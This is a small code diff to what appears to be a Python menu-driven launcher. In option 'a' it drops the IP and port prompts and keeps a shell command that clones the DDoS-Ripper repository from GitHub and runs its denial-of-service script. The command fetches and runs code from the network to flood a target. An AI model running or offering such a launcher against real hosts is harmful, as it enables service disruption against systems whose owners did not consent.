@@ -70,9 +70,8 @@ S = str(input("place option here::"))
 if 'a' in S:
     time.sleep(2)
     os.system(' clear ')
-    O = str(input(" whats the IP?:"))
-    V = str(input(" whats the port?:"))
-    os.system('git clone https://github.com/Palahsu/DDoS-Ripper.git && cd DDoS-Ripper && python3 DRipper.py -s {O} -p {V} ')
+  
+    os.system(' git clone https://github.com/Palahsu/DDoS-Ripper.git && cd DDoS-Ripper && python3 DRipper.py ')
     
 if 'b' in S:
     time.sleep(2)
